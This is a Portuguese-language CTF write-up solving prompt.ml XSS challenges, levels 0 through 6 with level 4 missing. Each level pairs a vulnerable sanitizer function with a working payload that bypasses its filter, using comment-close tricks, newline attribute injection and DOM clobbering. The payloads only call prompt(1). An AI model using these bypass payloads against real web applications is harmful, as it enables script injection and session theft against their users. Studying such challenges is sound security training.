# Prompt.ml

###### Solved by @Cubano2
> This is a CTF about 

## About the Challenge  
Aqui neste write-up se encontra as respostas do site [prompt.ml](https://prompt.ml/0)  

Nesse site tem desafios de XSS que ensinam sobre a gente sobre os tipos de vulnerabilidade em aplicação web e em navegadores.
O navegador usado neste write-up foi o Microsof Edge

## level 0
```Js
function escape(input) {
    // warm up
    // script should be executed without user interaction
    return '<input type="text" value="' + input + '">';
}        
```
O level 0 é bem tranquilo, com uma simples HTML injection consguimos passar dele.
level 0 ```"><script>prompt(1)</script>```

## level 1
```javascript
function escape(input) {
    // tags stripping mechanism from ExtJS library
    // Ext.util.Format.stripTags
    var stripTagsRE = /<\/?[^>]+>/gi;
    input = input.replace(stripTagsRE, '');

    return '<article>' + input + '</article>';
}        
```
level 1 ```<img src=1 onerror='prompt(1)'```
O level 1 coloca um nível de dificuldade a mais fazendo a gente burlar um regex que tem no código. A regex `/<\/?[^>]+>/gi` procura por `<…>` ou `</…>` e remove tudo entre os colchetes. Nisso ela espera um `>` no final. Contornando isso conseguimos passar.

## level 2
```javascript
 Text Viewer
function escape(input) {
    //                      v-- frowny face
    input = input.replace(/[=(]/g, '');

    // ok seriously, disallows equal signs and open parenthesis
    return input;
}        
```
level 2 ```<svg><script>prompt&#40;1)</script>```

Para contornar o filtro que remove `=` e `()`, usamos a entidade HTML ```&#40;``` no lugar do parêntese e evitamos o sinal de igual.

## level 3
```javascript
function escape(input) {
    // filter potential comment end delimiters
    input = input.replace(/->/g, '_');

    // comment the input to avoid script execution
    return '<!-- ' + input + ' -->';
}            
```
Level 3 ```--!><svg/onload=prompt(1)```
Para contornar o filtro (que remove ->), usamos o fechamento alternativo de comentário --!> definido no HTML5, fechamos o comentário e em seguida executamos o vetor SVG.


## level 5
```javascript
function escape(input) {
    // apply strict filter rules of level 0
    // filter ">" and event handlers
    input = input.replace(/>|on.+?=|focus/gi, '_');

    return '<input value="' + input + '" type="text">';
}                   
```
Level 5 ```"type=image src onerror
="prompt(1) ```
Neste nivel para contornar o filtro (que remove `>`, qualquer `on…=` e a palavra `focus`), exploramos o fato de que quebras de linha também separam atributos. Assim, escapamos do atributo atual e injetamos um handler


## level 6
```javascript
function escape(input) {
    // let's do a post redirection
    try {
        // pass in formURL#formDataJSON
        // e.g. http://httpbin.org/post#{"name":"Matt"}
        var segments = input.split('#');
        var formURL = segments[0];
        var formData = JSON.parse(segments[1]);

        var form = document.createElement('form');
        form.action = formURL;
        form.method = 'post';

        for (var i in formData) {
            var input = form.appendChild(document.createElement('input'));
            input.name = i;
            input.setAttribute('value', formData[i]);
        }

        return form.outerHTML + '                         \n\
<script>                                                  \n\
    // forbid javascript: or vbscript: and data: stuff    \n\
    if (!/script:|data:/i.test(document.forms[0].action)) \n\
        document.forms[0].submit();                       \n\
    else                                                  \n\
        document.write("Action forbidden.")               \n\
</script>                                                 \n\
        ';
    } catch (e) {
        return 'Invalid form data.';
    }
}                         
```
Level 6  ```javascript:prompt(1)#{"action":1}```

Para burlar o filtro que bloqueia javascript:, vbscript: e URIs data:, exploramos o DOM clobbering criando um <input name="action"> via JSON após o #, de modo que document.forms[0].action passa no teste e dispara nosso payload.
